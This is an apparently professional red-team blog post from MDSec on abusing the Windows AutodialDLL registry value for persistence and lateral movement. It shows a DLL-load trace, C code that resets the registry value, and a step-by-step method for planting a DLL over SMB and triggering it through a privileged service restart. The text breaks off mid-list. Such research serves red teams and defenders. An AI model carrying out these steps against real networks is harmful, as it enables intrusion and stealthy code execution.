---
title: Autodial(DLL)ing Your Way
url: https://www.mdsec.co.uk/2022/10/autodialdlling-your-way/
source: Penetration testing Archives - MDSec
date: 2022-10-27
fetch_date: 2025-10-03T21:03:59.001710
---

# Autodial(DLL)ing Your Way

* Our Services
* Knowledge Centre
* [About](https://www.mdsec.co.uk/about/)
* [Contact](https://www.mdsec.co.uk/contact/)

* Our Services
  + [Adversary Simulation](https://www.mdsec.co.uk/our-services/adversary-simulation/)
  + [Application Security](https://www.mdsec.co.uk/our-services/application-security/)
  + [Penetration Testing](https://www.mdsec.co.uk/our-services/penetration-testing/)
  + [Response](https://www.mdsec.co.uk/our-services/response/)
* Knowledge Centre
  + [Insights](https://www.mdsec.co.uk/knowledge-centre/insights/)
  + [Research](https://www.mdsec.co.uk/knowledge-centre/research/)
  + [Training](https://www.mdsec.co.uk/knowledge-centre/training/)
* [About](https://www.mdsec.co.uk/about/)
* [Contact](https://www.mdsec.co.uk/contact/)

* [![Adversary](https://www.mdsec.co.uk/wp-content/themes/mdsec/img/icons/icon-adversary.svg)

  ## Adversary Simulation

  Our best in class red team can deliver a holistic cyber attack simulation to provide a true evaluation of your organisation’s cyber resilience.](https://www.mdsec.co.uk/our-services/adversary-simulation/)
* [![Application Security](https://www.mdsec.co.uk/wp-content/themes/mdsec/img/icons/icon-application-security.svg)

  ## Application Security

  Leverage the team behind the industry-leading Web Application and Mobile Hacker’s Handbook series.](https://www.mdsec.co.uk/our-services/applicaton-security/)
* [![Penetration Testing](https://www.mdsec.co.uk/wp-content/themes/mdsec/img/icons/icon-penetration-testing.svg)

  ## Penetration Testing

  MDSec’s penetration testing team is trusted by companies from the world’s leading technology firms to global financial institutions.](https://www.mdsec.co.uk/our-services/penetration-testing/)
* [![Response](https://www.mdsec.co.uk/wp-content/themes/mdsec/img/icons/icon-response.svg)

  ## Response

  Our certified team work with customers at all stages of the Incident Response lifecycle through our range of proactive and reactive services.](https://www.mdsec.co.uk/our-services/response/)

* [## Research

  MDSec’s dedicated research team periodically releases white papers, blog posts, and tooling.](https://www.mdsec.co.uk/knowledge-centre/research/)
* [## Training

  MDSec’s training courses are informed by our security consultancy and research functions, ensuring you benefit from the latest and most applicable trends in the field.](https://www.mdsec.co.uk/knowledge-centre/training/)
* [## Insights

  View insights from MDSec’s consultancy and research teams.](https://www.mdsec.co.uk/knowledge-centre/insights/)

ActiveBreach

# Autodial(DLL)ing Your Way

[Home](https://www.mdsec.co.uk/) >
[Knowledge Centre](https://www.mdsec.co.uk/knowledge-centre/) >
[Insights](https://www.mdsec.co.uk/knowledge-centre/insights) >
Autodial(DLL)ing Your Way

The use of the `AutodialDLL` registry subkey (located in `HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters`) as a persistence method has been previously documented by [@Hexacorn](https://twitter.com/Hexacorn) in his series [Beyond good ol’ Run key, (Part 24)](https://www.hexacorn.com/blog/2015/01/13/beyond-good-ol-run-key-part-24/). The use of this persistence method by Threat Actors has been identified in the wild during last years, examples include:

* [KOMPROGO](https://www.first.org/resources/papers/conf2018/Inglot-Bartosz-and-Wong-Vincent_FIRST_20180606.pdf) backdoor integrated this persistence method.
* [Operation Dragon Castling](https://decoded.avast.io/luigicamastra/operation-dragon-castling-apt-group-targeting-betting-companies/).

Although its use has been limited to persistence only, this registry key can be used for other purposes. In this article we are going to discuss other creative tactics related to this registry key.

## Lateral Movement

When the WinSock2 library is used by a process, the process also loads other additional DLLs to provide the functionalities for different WinSock2 service providers. The DLL defined by the AutodialDLL subkey is one of these “extra” DLLs that can be loaded. By default, this is set to `c:\\windows\\system32\\rasadhlp.dll`.

If we modify this registry entry with a path to a dummy DLL that traces attach/detach events we can see how our DLL starts to be loaded gradually for each new process that tries to connect to the internet:

```
[+] On Attach!C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe
[+] On Attach!C:\Program Files\Sublime Text 3\sublime_text.exe
[+] On Attach!C:\Windows\system32\lsass.exe
[+] On Attach!C:\Windows\System32\dsregcmd.exe
[+] On Dettach!C:\Windows\System32\dsregcmd.exe
[+] On Attach!C:\Program Files\Mozilla Firefox\default-browser-agent.exe
[+] On Attach!C:\Windows\system32\svchost.exe
[+] On Attach!C:\Windows\System32\svchost.exe
[+] On Dettach!C:\Program Files\Mozilla Firefox\default-browser-agent.exe
[+] On Attach!C:\Windows\System32\dsregcmd.exe
[+] On Dettach!C:\Windows\System32\dsregcmd.exe
[+] On Attach!C:\Program Files\Mozilla Firefox\firefox.exe
[+] On Dettach!C:\Program Files\Mozilla Firefox\firefox.exe
[+] On Dettach!C:\Windows\System32\svchost.exe
[+] On Attach!C:\Windows\system32\msfeedssync.exe
[+] On Attach!C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeC2RClient.exe
[+] On Dettach!C:\Windows\system32\msfeedssync.exe
[+] On Dettach!C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeC2RClient.exe
[+] On Attach!C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeC2RClient.exe
[+] On Attach!C:\Program Files (x86)\Microsoft Visual Studio\Installer\resources\app\ServiceHub\Services\Microsoft.VisualStudio.Setup.Service\BackgroundDownload.exe
[+] On Dettach!C:\Program Files (x86)\Microsoft Visual Studio\Installer\resources\app\ServiceHub\Services\Microsoft.VisualStudio.Setup.Service\BackgroundDownload.exe
[+] On Attach!C:\Windows\system32\svchost.exe
[+] On Dettach!C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeC2RClient.exe
```

This behaviour can be exploited to perform lateral movement. Generally speaking, the idea is to upload a DLL to the target machine via SMB and then modify the registry via the Remote Registry service or WMI. Next time a process leverages Winsock2, it would load our planted DLL and the execution of our payload would be triggered. This generic approach needs to be polished to solve a few inconveniences:

* The DLL would be loaded by multiple processes until the registry key is restored.
* The DLL would be loaded by non-privileged processes, meaning that we would spawn multiple restricted beacons.

The first issue can be easily solved if our DLL proceeds to restore the registry entry once it is loaded by a process with sufficient privileges. To do this we can do something as simple as executing this on attach:

```
    LPCSTR orig = "C:\\windows\\system32\\rasadhlp.dll";
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "AutodialDLL", 0, REG_SZ, (LPBYTE)orig, strlen(orig) + 1);
        RegCloseKey(hKey);
    }
```

With this trick we can reduce the time frame where the DLL could be loaded but the problem of waiting for a high privileged process to load it still remains. The best way to reduce the time window, and at the same time ensure that the DLL is loaded by a juicy process (in the sense that it has sufficient privileges) is to start/restart a service immediately after modifying the registry entry. After testing, potential candidates include the BITS and Windows Insider (wisvc) services. This brings our end to end methodology to:

1. Upload the DLL to the target.
2. Check if Remote Registry is running, if not then start it.
3. Modify *HKLM\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\AutodialDLL* to point to our DLL.
4. If Remote Registry was not enabled, stop the service to keep the same status.
5. Check if Windows Insider Service (wisv...